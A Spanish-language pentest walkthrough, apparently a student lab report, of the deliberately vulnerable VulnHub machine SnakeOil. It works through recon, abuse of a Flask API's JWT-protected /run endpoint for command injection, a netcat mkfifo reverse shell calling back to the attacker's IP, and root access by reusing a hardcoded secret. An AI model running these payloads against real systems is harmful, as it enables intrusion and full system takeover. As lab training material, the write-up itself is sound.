MAIN_OBJECTIVE

> Objetivo General

Demostrar la capacidad de aplicar fundamentos teóricos y metodológicos de seguridad informática mediante la ejecución de una auditoría de penetración (pentesting) estructurada sobre la máquina virtual vulnerable "SnakeOil". El proyecto tiene como finalidad documentar, a través de un walkthrough exhaustivo, las fases de reconocimiento, identificación de vectores de ataque en una API REST, explotación de vulnerabilidades de ejecución remota de código (RCE) y escalamiento de privilegios, validando la eficacia de las técnicas empleadas en un entorno de pruebas controlado.

URL_TARGET: https://www.vulnhub.com/entry/digitalworldlocal-snakeoil,738/
SPECIFIC_GOALS

Objetivos Específicos

  • >>

    Configurar un entorno de virtualización aislado (Red NAT) para realizar las pruebas de penetración de forma segura y sin riesgo para infraestructuras externas.

  • >>

    Utilizar herramientas especializadas de descubrimiento y escaneo (como arp-scan y Nmap) para mapear la superficie de ataque e identificar servicios en ejecución.

  • >>

    Enumerar y analizar las rutas ocultas de la aplicación web utilizando técnicas de fuzzing para comprender la arquitectura de la API REST subyacente.

  • >>

    Investigar y evaluar las vulnerabilidades lógicas presentes en la gestión de autenticación (tokens JWT) y ejecución de comandos del servidor.

  • >>

    Seleccionar y adaptar vectores de explotación para lograr la ejecución remota de código (RCE) y establecer una conexión interactiva bidireccional (Reverse Shell).

  • >>

    Analizar el código fuente de la aplicación en la fase de post-explotación para identificar malas prácticas en la gestión de secretos (credenciales hardcodeadas).

  • >>

    Escalar privilegios aprovechando la reutilización de credenciales para obtener acceso administrativo (root) sobre el sistema objetivo.

  • >>

    Registrar y explicar detalladamente cada paso del proceso, incluyendo comandos, resultados teóricos y capturas de pantalla, garantizando la reproducibilidad del ataque.

PHASE_01

1. Configuración del Laboratorio

  • >>

    Máquina Atacante: Entorno Kali Linux encargado de orquestar el escaneo y la explotación.

  • >>

    Máquina Víctima: Máquina virtual vulnerable "SnakeOil".

  • >>

    Configuración de Red: Conexión mediante red NatNetwork (prefijo 10.0.2.0/24) garantizando el aislamiento del entorno de pruebas frente a redes externas (en lugar de usar el modo solo-anfitrión o red puente).

PHASE_02

2. Descubrimiento de hosts con arp-scan

Se empleó arp-scan porque opera en la capa 2 (enlace) y funciona aunque el host bloquee ICMP (ping) o TCP en su firewall.

# Escaneo de la red local para descubrir la IP de la máquina objetivo
(kali㉿kali)-[~]
$ sudo arp-scan -l

Posteriormente se verificó la conectividad con el comando ping; un TTL de 64 confirmó que el objetivo estaba activo y dio una primera pista de que el sistema operativo era Linux.

# Verificación de conectividad mediante paquetes ICMP
(kali㉿kali)-[~]
$ ping 10.0.2.4
PHASE_03

3. Reconocimiento de servicios con Nmap

Se ejecutó un escaneo utilizando -sC para lanzar scripts NSE predeterminados y -sV para la detección de versiones exactas, lo cual es vital para buscar CVEs.

# Escaneo de puertos abiertos y versiones de servicios
(kali㉿kali)-[~]
$ nmap -sC -sV 10.0.2.4

Se identificaron los puertos 22/tcp (SSH), 80/tcp y 8080/tcp (HTTP nginx 1.14.2).

PHASE_04

4. Enumeración de directorios con Gobuster

Gobuster realiza fuerza bruta de rutas usando un diccionario para descubrir áreas ocultas.

# Búsqueda de rutas ocultas en la aplicación del puerto 8080 probando extensiones
(kali㉿kali)-[~]
$ gobuster dir -u http://10.0.2.4:8080 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,js,bak,zip,sql,py

Esto indicó la presencia de una API REST, marcando /run (posible ejecución) y /secret (información protegida) como objetivos prioritarios.

PHASE_05

5. Análisis de la aplicación: API REST en Flask

Al tratarse de una API REST, la interacción se realiza mediante datos crudos (JSON) en lugar de formularios HTML.

PHASE_06

6. Registro de usuario y obtención del token JWT

Antes de atacar la autenticación, se probó la funcionalidad legítima para registrar una cuenta:

# Registro de un nuevo usuario en la API por método POST
(kali㉿kali)-[~]
$ curl -X POST http://10.0.2.4:8080/registration \
-H "Content-Type: application/json" \
-d '{"username":"sm", "password":"123"}'

Se realizó el login con el flag -v (verbose) para capturar el access_token de la respuesta HTTP.

# Autenticación para obtener el JWT y ver las cabeceras de respuesta
(kali㉿kali)-[~]
$ curl -X POST http://10.0.2.4:8080/login \
-H "Content-Type: application/json" \
-d '{"username":"sm","password":"123"}' -v
PHASE_07

7. Obtención de secret_key (Pivote del ataque)

Tras probar distintas formas de enviar el token (intentando por cookie y fallando), se descubrió que el endpoint /secret aceptaba el access_token del login mediante la cabecera Authorization: Bearer.

# Petición autenticada (exitosa) para extraer el secreto de ejecución
(kali㉿kali)-[~]
$ curl -s http://10.0.2.4:8080/secret \
-H "Authorization: Bearer [ACCESS_TOKEN_EMITIDO]"

Respuesta obtenida del servidor:

{"ip-address": "", "secret_key": "commandexecutionissecret"}
PHASE_08

8. Confirmación de ejecución remota en /run

Se envió una cadena de comandos de prueba al endpoint /run utilizando el secreto obtenido. Se buscaba obtener el máximo de información de una vez.

# Prueba de RCE encadenando comandos para ver identidad y arquitectura
(kali㉿kali)-[~]
$ curl -X POST http://10.0.2.4:8080/run \
-H "Content-Type: application/json" \
-d '{"url":"curl ifconfig.me && id && uname -a", "secret_key":"commandexecutionissecret"}'

Intentando preparar el entorno para una persistencia SSH, se introdujo un comando directo. Sin embargo, falló porque el servidor anteponía curl a la cadena introducida:

# Comando directo fallido; el servidor antepone 'curl' volviéndolo argumentos inválidos
(kali㉿kali)-[~]
$ curl -X POST http://10.0.2.4:8080/run \
-H "Content-Type: application/json" \
-d '{"url":"mkdir -p /home/patrick/.ssh", "secret_key":"commandexecutionissecret"}'
PHASE_09

9. Reverse shell hacia Kali

Al entender cómo la API ejecutaba comandos, se optó por forzarla a descargar un script malicioso. Primero se creó localmente usando heredoc:

# Creación del script de reverse shell interactivo localmente
(kali㉿kali)-[~]
$ cat > ~/shell2.sh << 'EOF'
#!/bin/sh
rm -f /tmp/f
mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.2.15 4444 > /tmp/f
EOF

Antes de atacar, se verificó localmente que el servidor temporal lo estuviera sirviendo correctamente:

# Verificación local del script para descartar errores antes del ataque
(kali㉿kali)-[~]
$ curl http://10.0.2.15/shell2.sh

Aprovechando que la aplicación ejecuta curl, se instruyó a la máquina víctima descargar el script y guardarlo en el directorio temporal.

# Ordenando a la víctima que descargue nuestro script malicioso y lo guarde
(kali㉿kali)-[~]
$ curl -X POST http://10.0.2.4:8080/run \
-H "Content-Type: application/json" \
-d '{"url":"curl http://10.0.2.15/shell2.sh -o /tmp/s2.sh", "secret_key":"commandexecutionissecret"}'

Antes de lanzar la orden de ejecución, se preparó el oyente en Kali con Netcat:

# Oyente de Netcat en Kali esperando la conexión de la víctima
(kali㉿kali)-[~]
$ nc -lvnp 4444

Finalmente, se envió la orden de ejecución a través de la API:

# Ejecución del payload descargado en la víctima
(kali㉿kali)-[~]
$ curl -X POST http://10.0.2.4:8080/run \
-H "Content-Type: application/json" \
-d '{"url":"sh /tmp/s2.sh", "secret_key":"commandexecutionissecret"}'
PHASE_10

10. Post-explotación: TTY y análisis del código

Recibida la conexión, se mejoró la shell creando una pseudo-terminal (TTY) con Python para habilitar interactividad completa.

# Spawn de una TTY completa en la reverse shell recibida
$ python3 -c 'import pty; pty.spawn("/bin/bash")'

Al explorar el directorio del proyecto, se listaron los archivos y se leyó el código fuente del backend.

# Listando estructura del proyecto y leyendo la configuración central de Flask
patrick@SNAKEOIL:~/flask_blog$ ls -l
patrick@SNAKEOIL:~/flask_blog$ cat app.py

Este archivo contenía secretos hardcodeados en texto plano, incluyendo la clave criptográfica para los tokens JWT:

app.config['JWT_SECRET_KEY'] = 'NOreasonabLeDOUBTthisPASSWORDisGOOD'
PHASE_11

11. Escalamiento de privilegios: de patrick a root

Sabiendo que patrick pertenecía al grupo sudo, se probó el reciclaje de contraseñas utilizando la frase hallada en el código fuente de Flask:

# Escalamiento al usuario root mediante el reciclaje del secreto JWT
patrick@SNAKEOIL:~/flask_blog$ sudo su
[sudo] password for patrick: NOreasonabLeDOUBTthisPASSWORDisGOOD
root@SNAKEOIL:/home/patrick/flask_blog#

> El escalamiento a root fue exitoso.

SYS_CONCLUSION

12. Conclusión

El ejercicio demostró que una intrusión completa no depende de un solo exploit sofisticado, sino de encadenar decisiones metodológicas: elegir ARP sobre ping, interpretar un error 405 como pista, iterar sobre el transporte del token JWT, interpretar correctamente un timeout como señal de éxito en una reverse shell, y escalar privilegios probando la reutilización de contraseñas expuestas en el código fuente.
